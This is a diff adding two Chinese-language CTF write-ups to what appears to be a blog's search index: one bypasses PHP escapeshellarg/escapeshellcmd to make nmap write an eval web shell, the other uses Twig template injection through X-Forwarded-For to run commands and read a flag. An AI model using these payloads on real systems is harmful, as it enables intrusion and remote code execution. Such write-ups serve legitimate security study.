@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>[ctf-web] BUUCTF2018-OnlineTool</title>
+    <link href="/2022/12/23/%5Bctf-web%5D%20BUUCTF2018-OnlineTools/"/>
+    <url>/2022/12/23/%5Bctf-web%5D%20BUUCTF2018-OnlineTools/</url>
+    
+    <content type="html"><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>进入就是php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>大概意思就是GET参数host，经过<code>escapeshellarg</code>和<code>escapeshellcmd</code>过滤之后，作为nmap的参数执行命令。关键的俩函数如何过滤？</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞 | 离别歌 (leavesongs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/36602107">利用&#x2F;绕过 PHP escapeshellarg&#x2F;escapeshellcmd函数 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_43085611/article/details/119523915">浅谈CTF中escapeshellarg的利用_slug01sh的博客-CSDN博客_escapeshellarg</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p></blockquote><p>关键的地方在：</p><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li></ol><p>所以使用这样的payload（注意空格）：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://80327b63-3188-4f0d-a74d-af0f1b05929d.node4.buuoj.cn:81/?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;hack&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php &#x27;</span><br></code></pre></td></tr></table></figure><p><code>-oG</code>是nmap中写入到文件的参数；</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212149371.png" alt="image-20221223212149371"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212342693.png" alt="image-20221223212342693"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221223212411856.png" alt="image-20221223212411856"></p><blockquote><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">BUUCTF 2018 Online Tool_恋物语战场原的博客-CSDN博客_buuctf online tool</a></p></blockquote>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>ctf-web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[ctf-web] BJDCTF2020-TheMysteryOfIp</title>
+    <link href="/2022/12/16/%5Bctf-web%5D%20BJDCTF2020-TheMysteryOfIp/"/>
+    <url>/2022/12/16/%5Bctf-web%5D%20BJDCTF2020-TheMysteryOfIp/</url>
+    
+    <content type="html"><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>进入是一个页面</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212858904.png" alt="image-20221216212858904"></p><p>上面主要有两个选项，进入Flag，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212932209.png" alt="image-20221216212932209"></p><p>只是显示了IP，没什么东西，看下Hint，在源代码中看到提示<code>Do you know why i know your ip?</code>，I don’t know.</p><p>bp抓包，修改请求，添加<code>X-Forwarded-For</code>，发现IP变了，但是这样后面没什么头绪了。</p><p>查了下发现了PHP中的<strong>Twig模板注入漏洞</strong>，类似Flask的J<strong>injia2模板注入漏洞</strong>，操作就是：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>执行命令，然后：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">highlight_file</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>得到flag。</p><p><a href="https://www.cnblogs.com/zzjdbk/p/13049923.html">SSTI（以Twig模板引擎为例） - My_Dreams - 博客园 (cnblogs.com)</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>ctf-web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[ctf-web] RoarCTF2019-EasyJava</title>
     <link href="/2022/12/15/%5Bctf-web%5D%20RoarCTF2019-EayaJava/"/>
     <url>/2022/12/15/%5Bctf-web%5D%20RoarCTF2019-EayaJava/</url>
